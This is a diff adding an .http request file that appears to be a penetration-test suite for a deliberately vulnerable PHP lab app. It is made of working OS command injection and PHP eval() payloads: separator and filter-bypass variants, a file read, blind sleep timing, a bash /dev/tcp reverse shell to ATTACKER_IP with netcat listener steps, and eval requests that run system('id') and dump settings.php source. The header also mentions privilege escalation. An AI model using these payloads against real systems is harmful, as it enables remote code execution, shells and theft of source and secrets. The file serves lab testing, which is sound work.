@@ -1,0 +1,159 @@
+### ============================================================================
+### 04 - A1 Injection / OS Command Injection and PHP code injection
+###
+###   commandi.php:       shell_exec("nslookup  " . commandi($target))   POST target
+###   commandi_blind.php: shell_exec("ping -c 1 " . commandi($target))    POST target
+###   php_eval.php:       @eval($_REQUEST["eval"])
+###
+###   The web server runs as uid=33(www-data). Commands that read a password
+###   file need root, so escalate with 07-commandi.http's sudo check or the
+###   local privilege escalation bugs - plain `id` is the baseline proof.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### CMDI-01  Baseline - semicolon separator
+###   The classic ; break-out. "nslookup" fails either way, so the nslookup
+###   error text is expected noise - the payload output is the finding.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%3B%20id&form=submit
+### Expected: 200, contains: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+### ---------------------------------------------------------------------------
+### CMDI-02  Pipe separator - the injected output REPLACES the nslookup output
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%20%7C%20id&form=submit
+### Expected: 200, "uid=33(www-data) ..."
+
+
+### ---------------------------------------------------------------------------
+### CMDI-03  && conditional chain
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%20%26%26%20uname%20-a&form=submit
+### Expected: 200, Linux kernel version string in the response
+
+
+### ---------------------------------------------------------------------------
+### CMDI-04  Single & (background) operator
+###   Included because "&" is a common filter bypass: naive filters strip "&&"
+###   or ";" but a lone "&" still runs the command.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%20%26%20id&form=submit
+### Expected: 200, "uid=33(www-data) ..."
+
+
+### ---------------------------------------------------------------------------
+### CMDI-05  Newline separator (%0a)
+###   A second bypass route: filters that normalise ";" and "&&" frequently
+###   forget that a bare newline is a command separator in sh.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%0Aid&form=submit
+### Expected: 200, "uid=33(www-data) ..."
+
+
+### ---------------------------------------------------------------------------
+### CMDI-06  Read a file to prove arbitrary read, not just arbitrary exec
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%3B%20cat%20%2Fetc%2Fhostname&form=submit
+### Expected: 200, the container id string
+
+
+### ---------------------------------------------------------------------------
+### CMDI-07  Interactive reverse shell (lab only)
+###   Replace the placeholder with a listener you control:
+###     Windows:  nc.exe -lvnp 4444
+###     Linux:    nc -lvnp 4444
+###   Then run this request and watch the listener.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261&form=submit
+### Expected: 200, reverse shell lands on your listener
+
+
+### ---------------------------------------------------------------------------
+### CMDI-08  BLIND command injection - out-of-band timing oracle
+###   commandi_blind.php's output is a fixed string ("Did you captured our
+###   GOLDEN packet?"), so nothing comes back in-band. Time the response
+###   instead: ~3s means the command executed.
+###   Baseline first: an un-delayed request returns in well under 1s.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi_blind.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1&form=submit
+### Expected: 200 fast, "Did you captured our GOLDEN packet?"
+
+
+### ---------------------------------------------------------------------------
+### CMDI-09  BLIND - inject a 5 second sleep and compare
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/commandi_blind.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%3B%20sleep%205&form=submit
+### Expected: 200 after ~5 seconds instead of <1s. That delta is the oracle.
+
+
+### ---------------------------------------------------------------------------
+### CODE-01  PHP code injection via eval() - system("id")
+###   php_eval.php passes $_REQUEST straight into eval(). This is not command
+###   injection, it is arbitrary PHP: no shell, no escaping, full language.
+###   Note this is the same class of bug as xss_eval.php but server-side.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/php_eval.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+eval=system(%22id%22)%3B
+### Expected: 200, "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+
+
+### ---------------------------------------------------------------------------
+### CODE-02  Arbitrary PHP - read the app source from inside PHP
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/php_eval.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+eval=echo%20file_get_contents(%22%2Fapp%2Fadmin%2Fsettings.php%22)%3B
+### Expected: 200, the full plaintext source of settings.php
